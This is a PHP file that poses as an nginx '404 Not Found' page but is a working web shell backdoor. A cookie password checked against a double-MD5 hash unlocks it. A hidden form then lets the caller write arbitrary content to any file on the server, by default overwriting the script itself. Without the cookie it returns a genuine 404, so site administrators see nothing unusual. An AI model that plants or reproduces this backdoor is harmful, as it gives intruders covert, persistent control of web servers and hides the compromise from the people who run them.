<?php
if (!isset($_COOKIE['passwd']) || (md5(md5($_COOKIE['passwd'])) != 'aa3cf71914022a16bfd6b87478d717fe')) {
    header("HTTP/1.1 404 Not Found");
    exit();
}
?>
<?php
if ($_POST)
{
    $f=fopen($_POST["f"],"w");
    if(fwrite($f,$_POST["c"]))
        echo "<font color=red>OK!</font>";
    else
        echo "<font color=blue>Error!</font>";
}
?>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
<form style="display: none;" action="" method="post">
    <input type="text" size=61 name="f" value='<?php echo $_SERVER["SCRIPT_FILENAME"];?>'><br><br>
    <textarea name="c" cols=60 rows=15></textarea><br>
    <input type="submit" id="b" value="Create"><br>
</form>
</body>
</html>
<?php
die("");
?>